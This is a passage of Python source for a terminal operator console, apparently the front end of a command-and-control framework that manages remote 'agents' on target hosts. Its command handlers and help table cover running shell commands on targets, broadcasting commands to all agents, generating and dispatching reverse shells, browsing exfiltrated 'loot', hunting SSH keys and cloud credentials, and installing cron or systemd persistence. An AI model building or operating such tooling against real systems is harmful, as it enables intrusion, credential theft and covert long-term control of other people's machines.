        t.add_column("Latest", style="cyan",        width=10)
        t.add_column("Agents", width=8,             justify="center")
        t.add_column("Status", width=14)
        for r in status:
            needs = r.get("needs_deploy", False)
            t.add_row(
                r.get("repo",""), r.get("latest","")[:8],
                str(len(r.get("agents",[]))),
                Text.from_markup("[yellow]⚠ stale[/yellow]" if needs else "[green]✓ current[/green]"),
            )
        self._log(t)

    def _cmd_adduser(self, args):
        if not args: self._log("  Usage: adduser <username>", "yellow"); return
        resp  = self._api("POST", f"/api/team/add/{args[0]}")
        creds = resp.json()
        self._log(Panel(
            f"[bold white]Username:[/bold white]  {creds.get('username')}\n"
            f"[bold white]Password:[/bold white]  [yellow]{creds.get('password')}[/yellow]  ← change on first login\n"
            f"[bold white]Gitea:[/bold white]     {creds.get('gitea_url')}\n\n"
            f"[bold]Clone (SSH):[/bold]\n  [cyan]{creds.get('ssh_clone')}<repo>.git[/cyan]\n\n"
            f"[bold]Clone (HTTPS):[/bold]\n  [cyan]{creds.get('http_clone')}<repo>.git[/cyan]\n\n"
            f"[dim]Onboard: bash ~/tower/scripts/team-onboard.sh --username {args[0]}[/dim]",
            title=f"[green]  Team Member: {args[0]}  [/green]", border_style="green",
        ))

    def _cmd_events(self, args):
        n = int(args[0]) if args else 20
        try:
            evts = self._api("GET", f"/api/events?limit={n}").json()
        except Exception:
            evts = []
        if not evts: self._log("  No events.", "dim"); return
        SEV = {"critical":"bold red","error":"red","warn":"yellow","info":"cyan","debug":"dim"}
        for ev in evts:
            sev = ev.get("severity", "info")
            ts  = str(ev.get("created_at",""))[:16]
            self._log(Text.assemble(
                (f"  {ts} ", "dim"),
                (f"{sev.upper():8} ", SEV.get(sev, "white")),
                (f"{ev.get('category','')}  ", "bold"),
                (ev.get("message",""), ""),
            ))

    def _cmd_tag(self, args):
        if len(args) < 2: self._log("  Usage: tag <agent> <tag>", "yellow"); return
        resp = self._api("PATCH", f"/api/agents/{args[0]}", json={"tags": args[1]})
        self._log(f"  ✓  Tagged {args[0]} → '{args[1]}'", "green")

    def _cmd_note(self, args):
        if len(args) < 2: self._log("  Usage: note <agent> <text>", "yellow"); return
        resp = self._api("PATCH", f"/api/agents/{args[0]}", json={"notes": " ".join(args[1:])})
        self._log(f"  ✓  Note saved for {args[0]}", "green")

    def _cmd_send_chat(self, args):
        if not args:
            self._log("  Usage: msg <text>", "yellow"); return
        message = " ".join(args)
        resp = self._api("POST", "/api/chat",
                         json={"author": HANDLE, "message": message, "channel": "general"})
        if resp.ok:
            if not self._chat_mode:
                self.action_toggle_chat()
            ts = datetime.now().strftime("%H:%M")
            self._chat_log(Text.assemble(
                (f"  {ts} ", "dim"),
                (HANDLE, "#58a6ff"),
                (": ", "dim"),
                (message, "white"),
            ))
        else:
            self._log(f"  ✗  Chat failed: {resp.status_code}", "red")

    def _cmd_modules(self):
        """List all available recon modules."""
        try:
            mods = self._api("GET", "/api/modules").json()
        except Exception:
            self._log("  ✗  Cannot reach server", "red"); return
        t = Table(box=box.ROUNDED, header_style="bold #58a6ff",
                  border_style="dim #30363d", expand=True)
        t.add_column("Module",      style="bold #d2a8ff", min_width=16)
        t.add_column("Priority",    width=10, justify="center")
        t.add_column("Description", style="#c9d1d9")
        t.add_column("Args",        style="dim #e3b341")
        PRIO = {1:"[bold red]CRIT[/bold red]", 3:"[yellow]HIGH[/yellow]",
                4:"[cyan]MED[/cyan]", 5:"[dim]NORM[/dim]", 10:"[dim]BKG[/dim]"}
        for m in mods:
            arg_str = ", ".join(
                f"{a['name']}{'*' if a['required'] else ''}"
                for a in m.get("args", [])
            )
            t.add_row(
                m["name"],
                Text.from_markup(PRIO.get(m["priority"], str(m["priority"]))),
                m["description"],
                arg_str or "[dim]none[/dim]",
            )
        self._log(t)
        self._log("  Run with:  run <module> [key=val ...]", "dim")

    def _cmd_run(self, args):
        """Run a recon module on the active agent."""
        if not self.active_agent:
            self._log("  ⚠  No target — use: use <agent>", "yellow"); return
        if not args:
            self._log("  Usage: run <module> [key=val ...]", "yellow"); return
        module  = args[0]
        margs   = {}
        for a in args[1:]:
            if "=" in a:
                k, v = a.split("=", 1)
                margs[k] = v
        resp = self._api("POST", f"/api/modules/{module}/run", json={
            "agent_id": self.active_agent["id"],
            "args":     margs,
        })
        if resp.ok:
            data = resp.json()
            self._log(
                f"  ✓  Module [bold #d2a8ff]{module}[/bold #d2a8ff] dispatched  "
                f"task [bold]{data.get('task_id')}[/bold]  "
                f"→ {self.active_agent['hostname']}\n"
                f"  [dim]Check output: task {data.get('task_id')}[/dim]",
                "green"
            )
        elif resp.status_code == 404:
            self._log(f"  ✗  Module '{module}' not found — modules to list all", "red")
        else:
            self._log(f"  ✗  {resp.status_code}: {resp.text[:100]}", "red")

    def _cmd_snapshots(self, args):
        """List recon snapshots for an agent."""
        aid = args[0] if args else (self.active_agent["id"] if self.active_agent else None)
        if not aid:
            self._log("  Usage: snapshots [agent_id]", "yellow"); return
        try:
            snaps = self._api("GET", f"/api/snapshots/{aid}").json()
        except Exception as e:
            self._log(f"  ✗  {e}", "red"); return
        if not snaps:
            self._log(f"  No snapshots for {aid}", "dim"); return
        t = Table(box=box.SIMPLE, header_style="bold #58a6ff",
                  border_style="dim", expand=True)
        t.add_column("ID",     style="dim",         width=6)
        t.add_column("Module", style="#d2a8ff",      min_width=16)
        t.add_column("Date",   style="dim",          width=20)
        t.add_column("Summary",style="#c9d1d9")
        for s in snaps:
            data    = s.get("data", {})
            summary = ""
            if "findings" in data:
                summary = f"{len(data['findings'])} findings"
            elif "total_processes" in data:
                summary = f"{data['total_processes']} procs, {len(data.get('flagged',[]))} flagged"
            elif "users" in data:
                summary = f"{len(data['users'])} users, sudo_nopasswd={data.get('sudo_nopasswd')}"
            elif "total_cron" in data:
                summary = f"{data['total_cron']} cron entries"
            t.add_row(str(s["id"]), s["module"], str(s["created_at"])[:16], summary)
        self._log(t)
        self._log("  Diff two snapshots: diff <snap_a_id> <snap_b_id>", "dim")

    def _cmd_diff(self, args):
        """Diff two recon snapshots."""
        if len(args) < 2:
            self._log("  Usage: diff <snap_a_id> <snap_b_id>", "yellow"); return
        aid = self.active_agent["id"] if self.active_agent else None
        if not aid:
            self._log("  ⚠  No target selected", "yellow"); return
        try:
            resp = self._api("GET", f"/api/snapshots/{aid}/diff",
                             params={"snap_a": args[0], "snap_b": args[1]})
        except Exception as e:
            self._log(f"  ✗  {e}", "red"); return
        if resp.status_code == 404:
            self._log("  ✗  Snapshot(s) not found", "red"); return
        data = resp.json()
        diff = data.get("diff", {})
        self._log(Panel(
            f"[bold white]Module:[/bold white] [#d2a8ff]{data.get('module')}[/#d2a8ff]  "
            f"Snapshot {args[0]} → {args[1]}\n\n"
            f"[bold green]Added ({len(diff.get('added',{}))})[/bold green]\n"
            + "\n".join(f"  + {k}: {v}" for k, v in (diff.get("added") or {}).items()) +
            f"\n\n[bold red]Removed ({len(diff.get('removed',{}))})[/bold red]\n"
            + "\n".join(f"  - {k}: {v}" for k, v in (diff.get("removed") or {}).items()) +
            f"\n\n[bold yellow]Changed ({len(diff.get('changed',{}))})[/bold yellow]\n"
            + "\n".join(
                f"  ~ {k}: {v.get('from')} → {v.get('to')}"
                for k, v in (diff.get("changed") or {}).items()
            ),
            title="[bold]Snapshot Diff[/bold]", border_style="yellow",
        ))

    def _cmd_help(self):
        t = Table(box=box.SIMPLE, show_header=False, border_style="dim",
                  expand=True, padding=(0, 1))
        t.add_column("Cmd",  style="bold #58a6ff", min_width=26)
        t.add_column("Desc", style="#c9d1d9")
        rows = [
            ("──── INFRASTRUCTURE ────", ""),
            ("agents",                   "All agents: tier, IP, status, git"),
            ("mesh",                     "T0 → T1 → T2 topology tree"),
            ("──── TARGETING ────", ""),
            ("use <id|host>",            "Set active target"),
            ("tier <agent> <0-2>",       "Set tier  0=Ctrl  1=Primary  2=Sub"),
            ("promote <agent>",          "Elevate → T1"),
            ("demote  <agent>",          "Reduce  → T2"),
            ("──── EXECUTION ────", ""),
            ("shell <cmd>",              "Run shell on active target"),
            ("<any command>",            "Bare input executes on active target"),
            ("broadcast    <cmd>",       "Send to ALL agents"),
            ("broadcast-t1 <cmd>",       "T1 primary agents only"),
            ("broadcast-t2 <cmd>",       "T2 sub-agents only"),
            ("──── REVERSE SHELLS ────", ""),
            ("revshell [type] [port]",   "Generate + dispatch reverse shell"),
            ("  types: bash bash2 zsh python powershell ps", ""),
            ("listen [port]",            "Show listener commands (nc/socat/ncat)"),
            ("──── TASKS ────", ""),
            ("task   <id>",              "Full task output (stdout/stderr)"),
            ("tasks  [agent]",           "Task list"),
            ("kill   <id>",              "Cancel pending task"),
            ("──── FILES ────", ""),
            ("upload   <local> <remote>","Push file to active agent"),
            ("download <remote>",        "Pull file from active agent"),
            ("sync <file> [t1|t2|all]", "Distribute file to all/tier agents"),
            ("loot [agent]",             "Browse exfiltrated files"),
            ("──── RECON MODULES ────", ""),
            ("modules",               "List all recon modules"),
            ("run <module> [k=v]",    "Run module on active target"),
            ("  sysinfo",             "OS fingerprint, uptime, memory, interfaces"),
            ("  network_enum",        "Ports, routes, ARP, connections"),
            ("  process_list",        "Running processes + flag suspicious ones"),
            ("  cred_hunt [search_root=/path]","Hunt .env, SSH keys, history, cloud creds"),
            ("  user_enum",           "Users, groups, sudo, SSH authorized_keys"),
            ("  sched_tasks",         "Cron, systemd timers, at jobs"),
            ("  persist [method=cron|systemd]","Install agent persistence"),
            ("snapshots [agent]",     "List stored recon snapshots"),
            ("diff <snap_a> <snap_b>","Diff two snapshots — show what changed"),
            ("──── GIT / DEPLOY ────", ""),
            ("deploy <repo> [agent|all]","Git pull + restart on agent(s)"),
            ("repos",                    "Gitea repo status + deploy state"),
            ("──── TEAM ────", ""),
            ("adduser <name>",           "Create Gitea account for teammate"),
            ("msg / chat <text>",        "Send team chat message (Ctrl+T for panel)"),
            ("──── META ────", ""),
            ("events [n]",              "Event log (default 20)"),
            ("tag  <agent> <tag>",       "Tag an agent"),
            ("note <agent> <text>",      "Add note to agent"),
            ("clear",                    "Clear output"),
            ("Ctrl+T",                   "Toggle chat panel"),
            ("Ctrl+R",                   "Refresh agent list"),
            ("Ctrl+A",                   "Show agents"),
            ("Ctrl+M",                   "Show mesh"),
            ("Escape",                   "Deselect target"),
            ("exit / quit",              "Exit console"),
        ]
        for cmd, desc in rows:
            if cmd.startswith("────"):
                t.add_row(Text(cmd, style="dim #58a6ff"), Text(desc, style="dim"))
            elif cmd.startswith("  "):
                t.add_row(Text(cmd, style="dim #8b949e"), Text(desc, style="dim"))
            else:
                t.add_row(cmd, desc)
        self._log(t)

    def watch_active_agent(self, _: Optional[dict]) -> None:
        self._update_status()


# ── Entrypoint ────────────────────────────────────────────────────────────────

def main():
    CUMMINS320().run()


if __name__ == "__main__":
    main()
